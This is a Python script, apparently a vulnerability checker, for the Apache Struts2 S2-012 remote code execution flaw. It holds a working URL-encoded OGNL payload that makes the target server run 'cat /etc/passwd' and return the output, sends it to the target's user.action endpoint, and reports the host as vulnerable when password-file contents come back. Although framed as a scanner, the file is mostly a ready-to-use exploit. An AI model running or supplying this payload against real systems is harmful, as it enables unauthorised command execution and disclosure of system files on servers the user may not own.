#!/usr/bin/env python
# _*_ coding: utf-8 _*_
import urllib
import requests




def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload='''
name=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22cat%22%2c+%22%2fetc%2fpasswd%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d
'''
def S2_012(arg):

    scheme, url, port = UrlProcessing(arg)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+'/user.action?'+payload
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': 'Mozilla/5.0(compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '571',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }
    s = requests.session()
    try:
        resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('root')!=-1 and con.lower().find('/bin/bash')!=-1:
            vul = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:2_1_0-2_3_13\r\nPayload:{}\r\n".format(url, payload_url)
            return (vul)
    except Exception as e:
        pass